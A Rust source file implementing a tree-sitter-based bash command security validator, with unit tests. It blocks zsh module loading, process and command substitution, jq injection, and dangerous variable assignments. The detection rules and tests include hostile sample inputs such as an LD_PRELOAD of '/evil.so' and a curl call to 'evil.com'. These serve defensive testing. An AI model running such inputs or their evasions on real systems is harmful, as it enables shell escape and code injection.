use tree_sitter::{Node, Parser};

pub struct ASTParser {
    parser: Parser,
}

impl ASTParser {
    pub fn new() -> Self {
        let mut parser = Parser::new();
        parser
            .set_language(&tree_sitter_bash::LANGUAGE.into())
            .expect("Error loading bash grammar");
        Self { parser }
    }

    pub fn parse_for_security(&mut self, cmd: &str) -> Result<(), String> {
        let tree = self.parser.parse(cmd, None).ok_or("Failed to parse command")?;
        let root_node = tree.root_node();

        // 1. Carriage return validation across the entire command
        if cmd.contains('\r') {
            return Err("Dangerous pattern detected: carriage return \\r".to_string());
        }

        self.walk_node_for_security(root_node, cmd)
    }

    fn walk_node_for_security(&self, node: Node<'_>, source: &str) -> Result<(), String> {
        let node_kind = node.kind();
        let text = &source[node.start_byte()..node.end_byte()];

        // 1. zmodload and zsh dangerous commands check
        if node_kind == "command" {
            if let Some(command_name_node) = node.child_by_field_name("name") {
                let name = &source[command_name_node.start_byte()..command_name_node.end_byte()];
                if name == "zmodload" || name.starts_with('=') {
                    return Err(format!("Dangerous pattern detected: zmodload or = expansion: {}", name));
                }
            }
        }

        // 2. ValidateJqCommand check
        if node_kind == "command" {
            if let Some(command_name_node) = node.child_by_field_name("name") {
                let name = &source[command_name_node.start_byte()..command_name_node.end_byte()];
                if name == "jq" {
                    // check if args contain dangerous logic, simple check for system()/env
                    if text.contains("system(") || text.contains("env") {
                        return Err("Dangerous pattern detected: jq command injection".to_string());
                    }
                }
            }
        }

        // 3. process substitution <() or >()
        if node_kind == "process_substitution" || text.starts_with("<(") || text.starts_with(">(") {
            if text.starts_with("<(") {
                return Err("Dangerous pattern detected: <() process substitution".to_string());
            }
            if text.starts_with(">(") {
                return Err("Dangerous pattern detected: >() process substitution".to_string());
            }
        }

        // 4. legacy expansions $[] or $() substitution fallback
        if node_kind == "expansion" || node_kind == "arithmetic_expansion" || node_kind == "command_substitution" {
            if text.starts_with("$[") && text.ends_with(']') {
                return Err("Dangerous pattern detected: $[] legacy expansion".to_string());
            }
            if text.starts_with("$(") {
                return Err("Dangerous pattern detected: $() command substitution".to_string());
            }
        }

        if node_kind == "word" || node_kind == "raw_string" || node_kind == "string" {
             if text.starts_with("$[") && text.ends_with(']') {
                  return Err("Dangerous pattern detected: $[] legacy expansion".to_string());
             }
             if text.starts_with("$(") {
                  return Err("Dangerous pattern detected: $() command substitution".to_string());
             }
        }

        // 5. ValidateDangerousVariables & ValidateIFSInjection
        if node_kind == "variable_assignment" {
            if let Some(name_node) = node.child_by_field_name("name") {
                let var_name = &source[name_node.start_byte()..name_node.end_byte()];
                if var_name == "IFS" {
                    return Err("Dangerous pattern detected: IFS injection".to_string());
                }
                if var_name == "LD_PRELOAD" || var_name == "PROMPT_COMMAND" || var_name == "BASH_ENV" || var_name == "ENV" || var_name == "PATH" {
                    return Err(format!("Dangerous pattern detected: assignment to dangerous variable {}", var_name));
                }
            }
        }


        let mut cursor = node.walk();
        for child in node.children(&mut cursor) {
            self.walk_node_for_security(child, source)?;
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_allowed_commands() {
        let mut parser = ASTParser::new();
        assert!(parser.parse_for_security("echo 'hello world'").is_ok());
        assert!(parser.parse_for_security("ls -l /tmp").is_ok());
        assert!(parser.parse_for_security("cat file.txt | grep foo").is_ok());
    }

    #[test]
    fn test_block_zmodload() {
        let mut parser = ASTParser::new();
        let res = parser.parse_for_security("zmodload zsh/net/tcp");
        assert!(res.is_err());
        assert!(res.unwrap_err().contains("zmodload"));
    }

    #[test]
    fn test_block_process_substitution_out() {
        let mut parser = ASTParser::new();
        let res = parser.parse_for_security("echo 'test' > >(cat)");
        assert!(res.is_err());
        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: >() process substitution");
    }

    #[test]
    fn test_block_process_substitution_in() {
        let mut parser = ASTParser::new();
        let res = parser.parse_for_security("cat < <(echo 'test')");
        assert!(res.is_err());
        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: <() process substitution");
    }

    #[test]
    fn test_block_legacy_expansion() {
        let mut parser = ASTParser::new();
        let res = parser.parse_for_security("echo $[1+1]");
        assert!(res.is_err());
        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: $[] legacy expansion");
    }

    #[test]
    fn test_block_carriage_return() {
        let mut parser = ASTParser::new();
        let res = parser.parse_for_security("echo 'hello\rworld'");
        assert!(res.is_err());
        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: carriage return \\r");
    }

    #[test]
    fn test_block_ifs_injection() {
        let mut parser = ASTParser::new();
        let res = parser.parse_for_security("IFS=; command");
        assert!(res.is_err());
        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: IFS injection");
    }

    #[test]
    fn test_block_dangerous_vars() {
        let mut parser = ASTParser::new();
        let res = parser.parse_for_security("LD_PRELOAD=/evil.so my_cmd");
        assert!(res.is_err());
        assert!(res.unwrap_err().contains("LD_PRELOAD"));
    }

    #[test]
    fn test_block_zsh_equals() {
        let mut parser = ASTParser::new();
        let res = parser.parse_for_security("=curl http://evil.com");
        assert!(res.is_err());
        assert!(res.unwrap_err().contains("= expansion"));
    }

    #[test]
    fn test_block_jq_injection() {
        let mut parser = ASTParser::new();
        let res = parser.parse_for_security("jq 'env.PATH' file.json");
        assert!(res.is_err());
        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: jq command injection");
    }

    #[test]
    fn test_block_command_substitution() {
        let mut parser = ASTParser::new();
        let res = parser.parse_for_security("echo $(whoami)");
        assert!(res.is_err());
        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: $() command substitution");
    }
}
